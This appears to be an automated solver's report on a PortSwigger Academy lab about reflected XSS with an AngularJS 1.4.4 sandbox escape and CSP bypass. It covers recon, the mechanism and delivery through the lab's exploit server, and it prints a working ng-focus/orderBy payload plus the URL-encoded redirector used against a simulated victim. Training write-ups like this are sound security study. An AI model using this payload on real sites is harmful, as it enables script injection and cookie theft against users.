# REPORT — Reflected XSS with AngularJS sandbox escape and CSP (EXPERT)

Status: **solved and verified** on 2026-11-06 (fresh instance).
Solver exit code 0 through the universal launcher.

## 1. Identification

| Item | Observed |
|---|---|
| Title | `Reflected XSS with AngularJS sandbox escape and CSP` |
| Difficulty | EXPERT |
| Back-link | `/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-and-csp` |
| Objective (from the Academy page) | XSS that bypasses CSP, escapes the AngularJS sandbox and alerts `document.cookie` |
| Exploit server | advertised in the lab header as `#exploit-link` (host discovered per instance) |

Static HTML of the lab instance carried no difficulty marker (it is rendered
client-side) — the EXPERT classification comes from the Academy lab page and
the repository index, not from the instance.

## 2. Recon

`GET /` (control request) returned:

```
Content-Security-Policy: default-src 'self'; script-src 'self';
                         style-src 'unsafe-inline' 'self'
```

```html
<script type="text/javascript" src="/resources/js/angular_1-4-4.js"></script>
...
<body ng-app ng-csp>
...
<h1>0 search results for '<input>'</h1>
```

Three facts decide the whole approach:

1. The reflection is inside an `<h1>` **within** `body[ng-app]`, so the injected
   markup is compiled as an Angular template as soon as the page bootstraps.
2. `script-src 'self'` without `unsafe-inline`/`unsafe-eval` kills inline
   scripts and inline event handlers. An HTML-only vector such as
   `<img src=x onerror=...>` is dead on arrival; the vector must be an Angular
   directive, because Angular evaluates expressions itself (this is the "CSP
   bypass" part of the lab name).
3. AngularJS **1.4.4** still contains the sandbox (removed in 1.6), and
   `<body ng-csp>` tells Angular not to rely on `eval` — expression evaluation
   still works through Angular's own machinery.

Version discovery was done from the script `src` (`angular[_-](\d+)[_-](\d+)`)
rather than hardcoding 1.4.4, and the solver refuses to run its 1.4-sandbox
vector on an instance that ships ≥ 1.6 (no sandbox ⇒ different lab).

## 3. Mechanism

Payload:

```
<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>
```

* `ng-focus` is an Angular directive: it binds an expression, so no inline
  handler attribute ever reaches the CSP gate.
* The sandbox denies direct access to `window` and the `constructor` chain, but
  a **filter argument** is evaluated once per element of the piped value without
  the same member checks. `orderBy` takes a predicate expression.
* `$event.composedPath()` is an array of the event's ancestors ending in
  `window`. When the predicate runs against the `window` entry, `(z=alert)`
  assigns the function and the following call `(document.cookie)` invokes it in
  window scope with the cookie as the argument.
* Delivery of the focus event needs no click: the injected input has
  `id=x` and the exploit URL ends in `#x`, so Chrome focuses the element on
  fragment navigation and `ng-focus` fires immediately.

The control request (before any delivery) confirmed the raw payload reflection
and the still-restrictive `script-src`, i.e. the sink and the filter state were
what the vector expects.

## 4. Delivery

The exploit server form (`GET /` on the exploit host) has fields
`urlIsHttps`, `responseFile`, `responseHead`, `responseBody` and a
`formAction` button value. The solver reads the form action and field names at
runtime. Stored body:

```html
<script>location='https://<LAB-ID>.web-security-academy.net/?search=%3Cinput%20id%3Dx%20ng-focus%3D%24event.composedPath%28%29%7CorderBy%3A%27%28z%3Dalert%29%28document.cookie%29%27%3E#x';</script>
```

`GET /exploit` on the exploit host was fetched back and compared to the stored
string (exact match) before delivering — a store that silently mangles the body
would otherwise present as "exploit did nothing". Then
`formAction=DELIVER_TO_VICTIM`.

## 5. Verification

Authoritative oracle only: the lab header widget.

```
<widgetcontainer-lab-status is-notsolved>  → baseline
<widgetcontainer-lab-status is-solved> + <p>Solved</p>  → after delivery
```

Timeline of the solving run:

| Time | Event |
|---|---|
| 0.4 s | lab identified, AngularJS 1.4.4 + CSP recorded |
| 0.9 s | baseline `not solved` |
| 1.2 s | control: payload reflected verbatim, `script-src 'self'` |
| 1.6 s | exploit form discovered, redirector built |
| 1.9 s | stored body verified via `GET /exploit` |
| 3.5 s | `DELIVER_TO_VICTIM` accepted |
| 3.9 s | lab widget `is-solved` / `<p>Solved</p>` |
| 4.2 s | access log fetched: victim `GET /exploit/` from `Mozilla/5.0 (Victim)` |

Totals: **9 HTTP requests, 4.2 s** (solver), 4.3 s including `uv` startup.

The access log also proves the victim actually fetched the exploit rather than
the checker flipping on a store: the `Mozilla/5.0 (Victim)` request appears at
the same second as the status flip.

## 6. Re-run behaviour (already-solved instance)

The lab header hides `#exploit-link` once solved. The solver reads the status
baseline first and, if already solved, reports
`caused by solver: no (was already solved)` and exits 0 without attempting a
delivery — verified on the same instance after the solve: 2 requests, 0.8 s
solver time, 1.3 s through the launcher, exit 0.

## 7. Artefacts

Local, git-ignored:

* `evidence/<stamp>-lab-baseline.html`
* `evidence/<stamp>-control-reflection.html`
* `evidence/<stamp>-exploit-body.txt`, `exploit-server-response.html`
* `evidence/<stamp>-lab-solved.html` (`is-solved` present twice)
* `evidence/<stamp>-access-log.html`, `access-log-summary.txt`
* `logs/<stamp>-solve.log` (every request + decision)
